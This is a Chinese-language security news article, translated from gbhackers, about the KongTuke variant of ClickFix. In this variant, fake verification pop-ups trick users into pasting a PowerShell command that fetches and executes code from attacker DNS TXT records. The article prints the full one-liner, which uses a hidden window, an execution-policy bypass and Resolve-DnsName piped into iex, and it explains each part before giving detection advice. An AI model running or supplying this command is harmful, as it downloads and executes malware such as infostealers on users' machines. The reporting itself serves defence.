---
title: 网络攻击者利用Click Fix脚本中的DNS TXT记录执行恶意Power Shell命令
url: https://www.anquanke.com/post/id/314749
source: 安全客-有思想的安全新媒体
date: 2026-02-06
fetch_date: 2026-02-07T04:07:32.143403
---

# 网络攻击者利用Click Fix脚本中的DNS TXT记录执行恶意Power Shell命令

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# 网络攻击者利用Click Fix脚本中的DNS TXT记录执行恶意Power Shell命令

阅读量**28383**

发布时间 : 2026-02-06 11:13:00

**x**

##### 译文声明

本文是翻译文章，文章原作者 Mayura Kathir，文章来源：gbhackers

原文地址：<https://gbhackers.com/dns-txt-records/>

译文仅供参考，具体内容表达以及含义原文为准。

![]()
“ClickFix” 社会工程学攻击活动迎来全新变种，该变种被命名为**KongTuke**。自 2025 年 12 月底起，这一变种被发现处于活跃传播状态，其显著特征是利用**DNS TXT 记录**存储并获取恶意载荷，成为该类攻击在规避检测手段上的一次重要转变。

“ClickFix” 攻击手法的典型操作，是攻陷正规网站或搭建虚假钓鱼页面，在页面中弹出带有欺骗性的 “人机验证” 或 “Chrome 浏览器更新” 弹窗。

与索要账户凭据的传统钓鱼攻击不同，ClickFix 会诱骗用户**手动执行恶意程序**。

该攻击的实施流程，是引导用户执行一系列特定操作，以 “修复问题” 或 “证明非机器人”：

1. 按下 Windows 键 + R，打开运行对话框；
2. 按下 Ctrl+V，将命令粘贴至输入框；
3. 按下回车键执行命令。

当用户在网页上与虚假弹窗产生交互时，恶意命令会通过 JavaScript 脚本**自动注入到用户的剪贴板**中。

### KongTuke 的 DNS 技术新手段

在 KongTuke 攻击活动中，剪贴板中的内容为一段 PowerShell 命令，其设计目的是从 DNS 记录中获取恶意代码，而非传统的从网页服务器加载。

近期的分析结果显示，被注入的命令遵循如下结构：

plaintext

```
powershell -w h -ep bypass -c "iex((Resolve-DnsName -Type TXT payload.bruemald.top -Server 8.8.8.8).Strings -join'')"
```

这段命令包含多项关键执行功能：

* **-w h**：隐藏 PowerShell 窗口，避免引起用户警觉；
* **-ep bypass**：绕过本地执行策略，允许恶意脚本运行；
* **Resolve-DnsName**：这是本次攻击的核心创新点。脚本不再通过 Invoke-WebRequest（wget/curl）从网址下载文件，而是查询受攻击者控制的域名（如 payload.bruemald.top）的 TXT 记录；
* **-Server 8.8.8.8**：强制通过谷歌公共 DNS 进行查询，绕过企业本地 DNS 的过滤机制或域名拦截策略，避免恶意域名在网络层面被阻断；
* **iex**：立即执行（Invoke-Expression）从 DNS TXT 记录中获取的文本字符串。

而虚假的人机验证弹窗，会引导用户将这段恶意 PowerShell 命令粘贴到 Windows 运行对话框中执行。

### 规避检测方式与攻击影响

攻击者将恶意载荷存储在 DNS TXT 记录中，避免了将恶意文件部署在网页服务器上，从而躲过 URL 过滤器或防火墙的扫描检测。

对于网络安全监控系统而言，这类操作产生的流量表现为**向公共 DNS 解析器（8.8.8.8）发起的标准 DNS 查询**，而这类请求在企业网络环境中通常是被允许的。

源码分析结果显示了被注入用户剪贴板的恶意 PowerShell 脚本的具体内容，该脚本执行后，会进一步获取第二阶段恶意载荷，这类载荷通常为信息窃取程序，或用于下载其他家族恶意软件的下载器。

承载这类 ClickFix 钓鱼页面的被攻陷域名（如已发现的[emierich.com](https://emierich.com)），往往能在被检测到前保持数天的活跃状态，原因在于其恶意内容**仅会向特定访问者进行动态注入**。

安全机构建议各企业：密切监控异常的 PowerShell 执行链，尤其是同时调用**Resolve-DnsName**和**iex**的操作行为；同时开展用户安全培训，明确告知用户 —— 正规的验证流程**绝不会要求**通过 Windows 运行对话框执行任何命令。

本文翻译自gbhackers [原文链接](https://gbhackers.com/dns-txt-records/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**安全客**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/314749](/post/id/314749)

安全KER - 有思想的安全新媒体

本文转载自: [gbhackers](https://gbhackers.com/dns-txt-records/)

如若转载,请注明出处： <https://gbhackers.com/dns-txt-records/>

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [安全资讯](/tag/%E5%AE%89%E5%85%A8%E8%B5%84%E8%AE%AF)
* [网络攻击](/tag/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB)

**+1**0赞

收藏

![](https://p4.ssl.qhimg.com/t010857340ce46bb672.jpg)安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p5.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p4.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=171771)

[安全客](/member.html?memberId=171771)

这个人太懒了，签名都懒得写一个

* 文章
* **1010**

* 粉丝
* **6**

### TA的文章

* ##### [网络攻击者利用Click Fix脚本中的DNS TXT记录执行恶意Power Shell命令](/post/id/314749)

  2026-02-06 11:13:00
* ##### [黑客正利用React服务端组件漏洞发起野外用攻击 部署恶意载荷](/post/id/314748)

  2026-02-06 11:12:32
* ##### [ValleyRAT伪装LINE安装程序发起攻击 窃取用户登录凭证](/post/id/314757)

  2026-02-06 11:12:01
* ##### [印度最高法院就WhatsApp数据共享作出里程碑式隐私裁决 判定其行为违规](/post/id/314774)

  2026-02-06 11:11:35
* ##### [PhantomVAI定制加载器借助RunPE工具发起攻击 针对用户实施恶意入侵](/post/id/314778)

  2026-02-06 11:11:11

### 相关文章

* ##### [黑客正利用React服务端组件漏洞发起野外用攻击 部署恶意载荷](/post/id/314748)

  2026-02-06 11:12:32
* ##### [ValleyRAT伪装LINE安装程序发起攻击 窃取用户登录凭证](/post/id/314757)

  2026-02-06 11:12:01
* ##### [印度最高法院就WhatsApp数据共享作出里程碑式隐私裁决 判定其行为违规](/post/id/314774)

  2026-02-06 11:11:35
* ##### [PhantomVAI定制加载器借助RunPE工具发起攻击 针对用户实施恶意入侵](/post/id/314778)

  2026-02-06 11:11:11
* ##### [Xcode 26.3落地macOS苹果正式引入智能体式AI编码功能](/post/id/314784)

  2026-02-06 11:10:45
* ##### [RapidFort完成4200万美元A轮融资 深耕自动化漏洞修复领域](/post/id/314788)

  2026-02-06 11:10:18
* ##### [CVE-2026-24735Apache Answer漏洞致私密帖子历史记录泄露](/post/id/314754)

  2026-02-06 11:09:38

### 热门推荐

文章目录

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)